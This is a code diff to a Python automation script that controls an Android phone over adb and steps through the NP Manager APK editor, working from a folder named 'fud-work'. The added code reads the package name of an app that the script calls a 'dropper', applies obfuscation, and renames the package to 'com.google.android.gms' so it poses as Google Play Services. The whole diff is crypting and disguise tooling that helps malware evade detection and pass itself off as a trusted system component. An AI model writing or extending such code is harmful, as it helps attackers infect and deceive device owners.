@@ -15,6 +15,11 @@ OUTPUT_DIR = os.environ.get("OUTPUT_DIR", os.path.expanduser("~/fud-work/output"
 SCREENSHOT_DIR = os.environ.get("SCREENSHOT_DIR", os.path.expanduser("~/fud-work/screenshots"))
 NP_PACKAGE = "com.wn.app.np"
 
+# Captured at runtime from APK info screen; used by CHANGE PACKAGE NAME tool
+DROPPER_PKG = None
+# Target package name to rename the dropper to
+NEW_PACKAGE_NAME = "com.google.android.gms"
+
 def run(cmd, timeout=30):
     try:
         return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
@@ -862,9 +867,30 @@ def scroll_tool_list_and_tap(tool_name):
         time.sleep(0.5)
     return False
 
+def extract_package_name_from_apk_info(xml):
+    """Read the package name value from the NP Manager APK info screen.
+    The screen shows 'Package name' label on the left and the value on the right
+    at approximately the same Y coordinate."""
+    nodes = find_any_bounds(xml)
+    pkg_label_y = None
+    for txt, x, y in nodes:
+        if txt.strip() == "Package name":
+            pkg_label_y = y
+            break
+    if pkg_label_y is not None:
+        for txt, x, y in nodes:
+            if abs(y - pkg_label_y) < 35 and txt.strip() and txt.strip() != "Package name":
+                pkg = txt.strip()
+                # Must look like a package name (contains dot, no spaces)
+                if "." in pkg and " " not in pkg and len(pkg) > 4:
+                    return pkg
+    return None
+
+
 def wait_for_apk_info_and_enter_function():
     """Wait for NP Manager APK info screen (FUNCTION/VIEW/INSTALL), then tap FUNCTION.
     Handles login re-check. Returns True if we reach the tools list."""
+    global DROPPER_PKG
     print("[REENTER] Waiting for APK info screen...")
     for wait_try in range(12):  # up to 24s
         time.sleep(2)
@@ -874,8 +900,14 @@ def wait_for_apk_info_and_enter_function():
         if any(kw in xml for kw in NP_TOOLS_KEYWORDS):
             print("[REENTER] Already on tools list")
             return True
-        # APK info screen — tap FUNCTION
+        # APK info screen — capture package name then tap FUNCTION
         if "FUNCTION" in texts_w:
+            pkg = extract_package_name_from_apk_info(xml)
+            if pkg and not DROPPER_PKG:
+                DROPPER_PKG = pkg
+                print(f"[PKG] Captured dropper package name: {DROPPER_PKG}")
+            elif DROPPER_PKG:
+                print(f"[PKG] Using cached dropper package name: {DROPPER_PKG}")
             print(f"[REENTER] APK info screen found (try {wait_try+1}), tapping FUNCTION...")
             tap_text(xml, "FUNCTION", "REENTER FUNCTION")
             time.sleep(5)
@@ -1035,6 +1067,57 @@ def handle_tool_result():
             print("[TOOL_CONFIG] Chose General obfuscation configuration")
             time.sleep(3)
             submitted = False  # reset — now on config form
+            continue
+
+        # 4b. CHANGE PACKAGE NAME config — fill in real old package name from APK info screen
+        if "Old Package name:" in texts and not submitted:
+            nodes_pkg = find_any_bounds(xml)
+            # Find the y-coordinate of the "Old Package name:" label
+            old_label_y = None
+            for txt, x, y in nodes_pkg:
+                if txt.strip() == "Old Package name:":
+                    old_label_y = y
+                    break
+            if old_label_y is not None and DROPPER_PKG:
+                # Tap the field directly below the label (next text node near same y or below)
+                for txt, x, y in nodes_pkg:
+                    if y > old_label_y and y < old_label_y + 120 and txt.strip() and txt.strip() != "Old Package name:":
+                        print(f"[PKG_CHANGE] Tapping old pkg field ('{txt.strip()}') @ ({x},{y})")
+                        adb(f"shell input tap {x} {y}")
+                        time.sleep(1)
+                        adb("shell input keyevent KEYCODE_CTRL_A")
+                        time.sleep(0.3)
+                        adb("shell input keyevent KEYCODE_DEL")
+                        time.sleep(0.3)
+                        adb(f"shell input text '{DROPPER_PKG}'")
+                        time.sleep(1)
+                        print(f"[PKG_CHANGE] Typed old package: {DROPPER_PKG}")
+                        break
+            # Also fill new package name field
+            new_label_y = None
+            for txt, x, y in nodes_pkg:
+                if txt.strip() == "New Package name:":
+                    new_label_y = y
+                    break
+            if new_label_y is not None:
+                for txt, x, y in nodes_pkg:
+                    if y > new_label_y and y < new_label_y + 120 and txt.strip() and txt.strip() != "New Package name:":
+                        print(f"[PKG_CHANGE] Tapping new pkg field ('{txt.strip()}') @ ({x},{y})")
+                        adb(f"shell input tap {x} {y}")
+                        time.sleep(1)
+                        adb("shell input keyevent KEYCODE_CTRL_A")
+                        time.sleep(0.3)
+                        adb("shell input keyevent KEYCODE_DEL")
+                        time.sleep(0.3)
+                        adb(f"shell input text '{NEW_PACKAGE_NAME}'")
+                        time.sleep(1)
+                        print(f"[PKG_CHANGE] Typed new package: {NEW_PACKAGE_NAME}")
+                        break
+            # Now tap CONFIRM to submit
+            time.sleep(1)
+            tap_text(get_xml(), "CONFIRM", "PKG_CHANGE submit")
+            submitted = True
+            time.sleep(6)
             continue
 
         # 5. CONFIRM / START on a config form → submit (only once per submission cycle)
